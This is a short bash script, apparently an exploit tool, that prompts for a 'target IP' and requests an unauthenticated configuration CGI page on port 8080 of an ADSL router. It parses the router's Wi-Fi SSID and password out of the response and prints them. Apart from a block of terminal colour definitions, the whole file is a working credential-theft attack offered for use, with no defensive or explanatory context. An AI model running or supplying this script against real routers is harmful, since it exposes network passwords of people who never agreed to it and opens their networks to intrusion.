# TERMINAL COLORS
# https://github.com/BlueArduino20/terminal-colors
BOLD_WHITE="\e[1;37m"
BOLD_GREEN="\e[1;32m"
BOLD_CYAN="\e[1;36m"
RED="\e[0;31m"
BOLD_RED="\e[1;31m"
# END OF TERMINAL COLORS

echo -e -n "$BOLD_GREEN Write the target IP > $BOLD_WHITE "
read IP
if [[ "$(curl --connect-timeout 5 -Is $IP | head -n 1)" == *"HTTP/1.1 200 OK"* ]]; then
	echo ""
	echo -e "${BOLD_CYAN}SSID: $BOLD_WHITE"
	curl -s http://$IP:8080/get_getnetworkconf.cgi | sed -e '4,11 d' | sed -e '1,2 d' | sed -e 's/<BR>//g'
	echo -e "${BOLD_CYAN}PASSWORD: $BOLD_WHITE"
	curl -s http://$IP:8080/get_getnetworkconf.cgi | sed -e '5,11 d' | sed -e '1,3 d' | sed -e 's/<BR>//g'
else
	echo -e "$BOLD_RED Error. Check the IP. ${RED}Make sure that the target ADSL has the 8080 port open."
fi;
